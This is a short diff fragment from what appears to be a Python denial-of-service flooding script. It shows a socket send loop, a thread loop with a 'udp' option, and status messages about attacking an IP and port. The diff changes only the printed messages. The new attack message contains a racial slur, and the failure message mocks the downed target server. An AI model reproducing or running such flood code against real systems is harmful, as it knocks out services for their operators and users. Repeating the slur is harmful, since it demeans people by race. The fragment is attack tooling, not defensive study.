@@ -58,13 +58,13 @@ def run2():
 
 				s.send(data)
 
-			print("\033[1;36;40mSlayerEx Attack %s Port %s"%(ip,port))
+			print("\033[1;36;40mNiggas attacks %s Port %s"%(ip,port))
 
 		except:
 
 			s.close()
 
-			print("Down!!")
+			print("server is dead please contact costumer service...")
 
 for y in range(threads):
     if choice == 'udp':
